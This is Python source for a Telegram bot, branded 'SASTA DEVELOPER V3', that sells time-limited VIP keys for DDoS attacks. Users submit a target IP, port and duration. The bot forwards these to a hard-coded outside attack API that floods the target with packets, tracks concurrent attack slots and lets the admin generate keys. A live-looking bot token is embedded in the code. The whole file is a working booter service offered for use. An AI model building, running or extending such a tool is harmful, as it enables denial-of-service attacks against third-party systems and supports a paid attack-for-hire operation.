import telebot
import time
import json
import random
import string
import os
import threading
import requests
from flask import Flask
from telebot import types

# --- FLASK FOR RAILWAY ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIGURATION ---
TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
ADMIN_ID = 8787952549
API_URL = "http://13.203.155.253/attack"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- GLOBAL TRACKING ---
MAX_CONCURRENT = 2
running_attacks = 0
attack_slots = {} 

# --- DATABASE ---
def load_data(file, default):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return default
    return default

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_data("users.json", {})
keys = load_data("keys.json", {})

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"expiry": 0, "name": message.from_user.first_name}
        save_data("users.json", users)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 ATTACK", "📊 STATUS", "👤 PROFILE", "🎫 REDEEM")
    
    bot.send_message(message.chat.id, 
        f"🚀 **WELCOME TO SASTA DEVELOPER V3**\n\n"
        f"**Available Slots:** `{MAX_CONCURRENT - running_attacks}/{MAX_CONCURRENT}`\n"
        f"**Your Rank:** `{'ADMIN' if int(uid) == ADMIN_ID else 'VIP' if users[uid]['expiry'] > time.time() else 'FREE'}`", 
        reply_markup=markup)

# --- ATTACK SYSTEM ---
@bot.message_handler(func=lambda m: m.text == "🚀 ATTACK")
def attack_req(message):
    global running_attacks
    uid = str(message.from_user.id)
    
    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **Access Denied!** Please redeem a VIP key."); return
    
    if running_attacks >= MAX_CONCURRENT and int(uid) != ADMIN_ID:
        bot.reply_to(message, f"⚠️ **ALL SLOTS BUSY!**\nWait for an attack to finish.\nSlots: `{running_attacks}/{MAX_CONCURRENT}`"); return
    
    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME` (Example: `1.1.1.1 80 60`)")
    bot.register_next_step_handler(msg, run_attack_logic)

def run_attack_logic(message):
    global running_attacks
    uid = str(message.from_user.id)
    try:
        parts = message.text.split()
        if len(parts) != 3: raise ValueError
        ip, port, duration = parts
        duration_int = int(duration)
        
        running_attacks += 1
        attack_slots[uid] = {"target": f"{ip}:{port}", "end": time.time() + duration_int, "user": message.from_user.first_name}

        sent = bot.send_message(message.chat.id, "⚙️ **Connecting to API...**")
        
        def call_api():
            global running_attacks
            full_url = f"{API_URL}?ip={ip}&port={port}&time={duration}&key=DESTRUCTED"
            try: requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
            except: pass
            
            # Start Animation
            bot.edit_message_text(
                f"🔥 **ATTACK STARTED** 🔥\n━━━━━━━━━━━━━━\n"
                f"🎯 **Target:** `{ip}:{port}`\n"
                f"⏳ **Duration:** `{duration}s`\n"
                f"🚀 **Status:** `Sending Packets...`", 
                message.chat.id, sent.message_id
            )
            
            time.sleep(duration_int)
            
            # End Animation
            running_attacks -= 1
            attack_slots.pop(uid, None)
            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED** ✅\n━━━━━━━━━━━━━━\n🎯 **Target:** `{ip}:{port}`\n💎 **Slot Released Successfully!**")

        threading.Thread(target=call_api).start()
    except:
        bot.reply_to(message, "❌ **Invalid Format!** Please use `IP PORT TIME`.")

# --- REDEEM & ADMIN ALERTS ---
@bot.message_handler(func=lambda m: m.text == "🎫 REDEEM")
def redeem(message):
    msg = bot.send_message(message.chat.id, "⌨️ **Enter your VIP Key:**")
    bot.register_next_step_handler(msg, process_redeem)

def process_redeem(message):
    uid = str(message.from_user.id)
    key = message.text.strip()
    if key in keys:
        duration = keys.pop(key)
        users[uid]['expiry'] = max(users[uid].get('expiry', 0), time.time()) + duration
        save_data("users.json", users)
        save_data("keys.json", keys)
        
        # Admin Notification
        bot.send_message(ADMIN_ID, f"🔔 **KEY REDEEMED!**\n👤 **User:** `{message.from_user.first_name}`\n🆔 **ID:** `{uid}`\n🔑 **Key:** `{key}`\n⏳ **Added:** `{duration//86400} Days`")
        
        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!** Enjoy your access.")
    else:
        bot.reply_to(message, "❌ **Invalid or Expired Key!**")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.split()[1])
        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        keys[key] = days * 86400
        save_data("keys.json", keys)
        bot.reply_to(message, f"🎫 **NEW KEY:** `{key}`\n⏳ **Duration:** `{days} Days`")
    except: bot.reply_to(message, "Usage: `/genkey <days>`")

@bot.message_handler(commands=['running'])
def show_running(message):
    if message.from_user.id != ADMIN_ID: return
    if not attack_slots:
        bot.reply_to(message, "🛰️ No active attacks."); return
    msg = "🚀 **ACTIVE ATTACKS**\n\n"
    for uid, info in attack_slots.items():
        msg += f"👤 `{info['user']}` -> `{info['target']}`\n"
    bot.send_message(message.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
def status(message):
    msg = f"📊 **SYSTEM STATUS**\n━━━━━━━━━━━━━━\n"
    msg += f"🔥 **Active Slots:** `{running_attacks}/{MAX_CONCURRENT}`\n"
    msg += f"🟢 **System:** `Online`"
    bot.send_message(message.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
def profile(message):
    uid = str(message.from_user.id)
    rem = int(users.get(uid, {}).get('expiry', 0) - time.time())
    days = max(0, rem // 86400)
    bot.send_message(message.chat.id, f"👤 **Profile:** `{users[uid]['name']}`\n🆔 **ID:** `{uid}`\n⏳ **VIP Remaining:** `{days} Days`")

# --- MAIN ---
if __name__ == "__main__":
    threading.Thread(target=run_web).start() # Health Check
    print(">>> SASTA DEVELOPER BOT IS LIVE!")
    bot.infinity_polling(skip_pending=True)
